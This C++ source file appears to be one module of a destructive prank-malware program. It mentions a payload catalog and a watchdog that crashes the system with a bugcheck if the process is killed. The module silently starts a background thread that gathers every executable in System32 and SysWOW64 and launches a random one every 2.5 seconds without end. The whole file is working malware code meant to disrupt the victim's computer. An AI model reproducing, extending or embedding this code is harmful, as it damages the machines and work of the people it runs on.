// Spawner: the application on its own, outside the payload catalog,
// opens random .exe files from System32 / SysWOW64. Mirrors the old
// "27 - Programs" payload, but as a silent background behavior that
// does not occupy a payload slot.
#include "spawner.h"

#include "seed.h"

#include <windows.h>
#include <shellapi.h>

#include <cstdlib>
#include <string>
#include <vector>

namespace {

    void Collect(const std::wstring& dir, std::vector<std::wstring>& out)
    {
        WIN32_FIND_DATAW fd;
        HANDLE h = FindFirstFileW((dir + L"\\*.exe").c_str(), &fd);

        if (h == INVALID_HANDLE_VALUE)
            return;

        do
        {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                out.push_back(dir + L"\\" + fd.cFileName);
        }
        while (FindNextFileW(h, &fd));

        FindClose(h);
    }

    // Scans both system dirs once and then keeps opening a random
    // .exe every couple of seconds until the process dies (which,
    // post-watchdog, means a bugcheck).
    DWORD WINAPI Rampage(LPVOID)
    {
        // Derive randomness from the old 27 variant slot; SeedGet
        // is id-agnostic, so the freed payload id still yields a
        // stable per-run rng.
        srand(SeedRand(27));

        std::vector<std::wstring> all;

        wchar_t buf[MAX_PATH];
        UINT n = GetWindowsDirectoryW(buf, MAX_PATH);
        std::wstring winDir = (n != 0 && n < MAX_PATH)
            ? std::wstring(buf, n)
            : L"C:\\Windows";

        Collect(winDir + L"\\System32", all);
        Collect(winDir + L"\\SysWOW64", all); // absent on 32-bit XP

        if (all.empty())
            return 0;

        for (;;)
        {
            const std::wstring& pick = all[rand() % all.size()];

            ShellExecuteW(
                nullptr,
                L"open",
                pick.c_str(),
                nullptr,
                nullptr,
                SW_SHOW
            );

            Sleep(2500);
        }

        return 0;
    }
}

namespace Spawner {

    void Start()
    {
        HANDLE h = CreateThread(
            nullptr,
            0,
            Rampage,
            nullptr,
            0,
            nullptr
        );

        if (h)
            CloseHandle(h);
    }

} // namespace Spawner